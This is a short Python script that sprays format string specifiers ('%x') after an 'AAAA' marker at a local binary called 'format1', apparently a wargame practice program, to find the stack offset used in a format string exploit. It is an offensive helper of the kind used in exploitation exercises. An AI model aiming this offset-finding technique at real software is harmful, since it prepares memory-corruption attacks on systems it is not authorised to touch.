#!/usr/bin/python
import os

egg = "AAAA"
hex_egg = egg.encode("utf-8").hex()


def desc():
  print('[+] Running Simple Format String Spraying...')
  print('[+] Setting Egg: ', hex_egg)


def spraying():
  i = 1
  while i < 200:
    c = int(i)
    p = './format1 ' + egg + ("%x" * c) + "%x"
    out = os.popen(p).read()
    s = str(out)
  
    if hex_egg in s:
      print('[+] Egg found! ...{0}'.format(out[-30:]))
      print('[+] Found Offset: {0}'.format(i))
      return i
      break  
    else:
      i += 1
      continue


if __name__ == "__main__":
  desc()
  print(spraying())